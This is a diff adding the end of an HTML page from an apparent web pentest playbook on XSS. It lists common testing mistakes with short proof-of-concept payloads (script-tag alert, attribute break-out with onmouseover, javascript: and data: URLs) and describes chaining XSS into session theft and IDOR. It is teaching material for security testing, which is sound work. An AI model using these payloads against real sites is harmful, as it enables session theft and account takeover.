+    <!-- ═══ COMMON MISTAKES ═══ -->
+    <section id="mistakes">
+      <h2>Common Beginner Mistakes</h2>
+
+      <div class="callout warn">
+        <div class="callout-title">Mistake #1: Only Testing &lt;script&gt; Tags</div>
+        <p>Many testers only try <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> and give up. Other attack vectors exist: img tags with onerror, SVG with onload, event attributes in existing HTML. Always test multiple payloads.</p>
+      </div>
+
+      <div class="callout warn">
+        <div class="callout-title">Mistake #2: Forgetting Stored XSS</div>
+        <p>Beginners focus on reflected XSS (in URLs) and miss stored XSS (in databases). Test comment fields, profile bios, review sections. Submit a payload, log out, log back in  · does it still execute?</p>
+      </div>
+
+      <div class="callout warn">
+        <div class="callout-title">Mistake #3: Not Testing DOM-based XSS</div>
+        <p>Look at the page source. If you see <code>document.location = something</code> or <code>innerHTML = something</code> processing user input, test for DOM XSS. Use URL fragments (#), not query strings, to test. The payload might not appear in the HTTP response but still execute in JavaScript.</p>
+      </div>
+
+      <div class="callout warn">
+        <div class="callout-title">Mistake #4: Not Adapting Payload to Context</div>
+        <p>If your payload appears inside a quoted attribute, <code>&lt;script&gt;</code> won't execute. You need: <code>" onmouseover="alert(1)</code>. Look at where your test input appears in the response, then craft the appropriate payload.</p>
+      </div>
+
+      <div class="callout warn">
+        <div class="callout-title">Mistake #5: Assuming HTML Encoding is Sanitization</div>
+        <p>If the server sends back <code>&amp;lt;script&amp;gt;</code>, it's still rendered as <code>&lt;script&gt;</code> in HTML. This is often safe, but check the actual browser rendering. Some encoding is insufficient for all contexts.</p>
+      </div>
+
+      <div class="callout warn">
+        <div class="callout-title">Mistake #6: Testing Only GET Parameters</div>
+        <p>POST data, JSON bodies, headers, and cookies are vulnerable too. Use Burp Repeater to test every input channel, not just URL parameters.</p>
+      </div>
+
+      <div class="callout warn">
+        <div class="callout-title">Mistake #7: Using alert(1) Without Understanding What Broke It</div>
+        <p>If <code>alert()</code> doesn't work, try <code>console.log()</code>, check browser console errors, or use a different event. Sometimes alert() is blocked but other JavaScript functions run fine. Test a series of payloads, not just one.</p>
+      </div>
+
+      <div class="callout warn">
+        <div class="callout-title">Mistake #8: Forgetting javascript: Protocol in href</div>
+        <p>Links with <code>href="javascript:alert(1)"</code> execute XSS. Also test data URLs: <code>href="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"</code>.</p>
+      </div>
+    </section>
+
+    <!-- ═══ SEE ALSO ═══ -->
+    <h2 id="see-also">🔗 See Also  · Attack Chains</h2>
+    <p>XSS is one of the most chainable vulnerabilities  · it turns a client-side bug into server-side impact.</p>
+    <div class="see-also-grid">
+      <a class="see-also-card" href="csrf.html">
+        <span class="sa-icon">🎭</span>
+        <span class="sa-name">CSRF</span>
+        <span class="sa-why">XSS completely bypasses CSRF tokens  · you can forge any request from the victim's browser.</span>
+      </a>
+      <a class="see-also-card" href="cors.html">
+        <span class="sa-icon">🌍</span>
+        <span class="sa-name">CORS</span>
+        <span class="sa-why">XSS on a trusted subdomain bypasses CORS restrictions  · gives cross-origin API access.</span>
+      </a>
+      <a class="see-also-card" href="prototype-pollution.html">
+        <span class="sa-icon">☣️</span>
+        <span class="sa-name">Prototype Pollution</span>
+        <span class="sa-why">Client-side prototype pollution often leads to XSS via DOM gadgets. Frequently found together.</span>
+      </a>
+      <a class="see-also-card" href="idor.html">
+        <span class="sa-icon">🚪</span>
+        <span class="sa-name">IDOR</span>
+        <span class="sa-why">Steal admin session via XSS → use that session to exploit IDOR as admin → full data access.</span>
+      </a>
+    </div>
+
+  </main>
+</div>
+
+<script>
+// Copy button functionality
+document.querySelectorAll('pre').forEach(pre => {
+  const btn = document.createElement('button');
+  btn.className = 'copy-btn';
+  btn.textContent = 'Copy';
+  pre.appendChild(btn);
+  btn.addEventListener('click', () => {
+    navigator.clipboard.writeText(pre.querySelector('code')?.innerText || pre.innerText);
+    btn.textContent = 'Copied!';
+    btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
+  });
+});
+
+// Active sidebar navigation on scroll
+const sections = document.querySelectorAll('[id]');
+const navLinks = document.querySelectorAll('#sidebar a');
+const observer = new IntersectionObserver(entries => {
+  entries.forEach(e => {
+    if (e.isIntersecting) {
+      navLinks.forEach(a => a.classList.toggle('active', a.getAttribute('href') === '#' + e.target.id));
+    }
+  });
+}, { rootMargin: '-20% 0px -70% 0px' });
+sections.forEach(s => observer.observe(s));
+
+// Checklist persistence
+const STORAGE_KEY = 'xss-checklist';
+document.querySelectorAll('.checklist-item input[type=checkbox]').forEach((cb, i) => {
+  const saved = localStorage.getItem(STORAGE_KEY + i);
+  if (saved === 'true') { cb.checked = true; cb.closest('.checklist-item').classList.add('done'); }
+  cb.addEventListener('change', () => {
+    localStorage.setItem(STORAGE_KEY + i, cb.checked);
+    cb.closest('.checklist-item').classList.toggle('done', cb.checked);
+    updateProgress();
+  });
+});
+function updateProgress() {
+  document.querySelectorAll('.checklist-wrap').forEach(wrap => {
+    const all = wrap.querySelectorAll('input[type=checkbox]');
+    const done = wrap.querySelectorAll('input[type=checkbox]:checked');
+    const mini = wrap.querySelector('.progress-mini');
+    const bar = wrap.querySelector('.progress-bar');
+    if (mini) mini.textContent = done.length + '/' + all.length;
+    if (bar) bar.style.width = (all.length ? (done.length/all.length*100) : 0) + '%';
+  });
+}
+updateProgress();
+</script>
+
+<script>
+(function(){
+  var t = localStorage.getItem('theme') || 'dark';
+  document.documentElement.setAttribute('data-theme', t);
+  var btn = document.getElementById('theme-toggle');
+  if(btn){
+    btn.textContent = t === 'dark' ? '☀ Light' : '🌙 Dark';
+    btn.addEventListener('click', function(){
+      var n = document.documentElement.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
+      document.documentElement.setAttribute('data-theme', n);
+      localStorage.setItem('theme', n);
+      btn.textContent = n === 'dark' ? '☀ Light' : '🌙 Dark';
+    });
+  }
+  var ham = document.getElementById('hamburger');
+  var sb = document.getElementById('sidebar');
+  var ov = document.getElementById('sidebar-overlay');
+  if(ham && sb && ov){
+    ham.addEventListener('click', function(){ sb.classList.toggle('open'); ov.classList.toggle('open'); });
+    ov.addEventListener('click', function(){ sb.classList.remove('open'); ov.classList.remove('open'); });
+  }
+})();
+</script>
+<script src="search.js"></script>
+
+<footer class="site-footer">
+  <div class="footer-inner">
+    <div class="footer-grid">
+      <div class="footer-brand">
+        <a href="../index.html" class="footer-logo-link">
+          <div class="footer-logo-icon">
+            <svg viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg" width="15" height="15"><rect x="2" y="1" width="10" height="8" rx="2" stroke="#7c3aed" stroke-width="1.2"/><circle cx="7" cy="5" r="1.5" fill="#7c3aed"/></svg>
+          </div>
+          <span class="footer-logo-text">Web Pentest Playbook</span>
+        </a>
+        <p class="footer-tagline">A workflow-first reference for web application security testing.</p>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-title">Vulnerabilities</div>
+        <a href="sqli.html" class="footer-link">SQL Injection</a>
+        <a href="xss.html" class="footer-link">XSS</a>
+        <a href="ssrf.html" class="footer-link">SSRF</a>
+        <a href="jwt.html" class="footer-link">JWT Attacks</a>
+        <a href="../index.html" class="footer-link">+ 19 more →</a>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-title">Resources</div>
+        <a href="https://portswigger.net/web-security" target="_blank" rel="noopener noreferrer" class="footer-link">PortSwigger Academy ↗</a>
+        <a href="https://owasp.org/Top10" target="_blank" rel="noopener noreferrer" class="footer-link">OWASP Top 10 ↗</a>
+        <a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" rel="noopener noreferrer" class="footer-link">PayloadsAllTheThings ↗</a>
+        <a href="https://book.hacktricks.xyz" target="_blank" rel="noopener noreferrer" class="footer-link">HackTricks ↗</a>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-title">About</div>
+        <a href="../web-pentest-playbook.html" class="footer-link">5-Day Playbook</a>
+        <a href="../index.html" class="footer-link">All Vulnerabilities</a>
+        <a href="../thanks.html" class="footer-link">Special Thanks</a>
+        <a href="https://github.com/eligof/WebSec" target="_blank" rel="noopener noreferrer" class="footer-link">GitHub ↗</a>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <span>© 2025 Web Pentest Playbook · MIT License</span>
+      <span>Inspired by <a href="../thanks.html">Tomer Hadad</a></span>
+    </div>
+  </div>
+</footer>
+</body>
+</html>
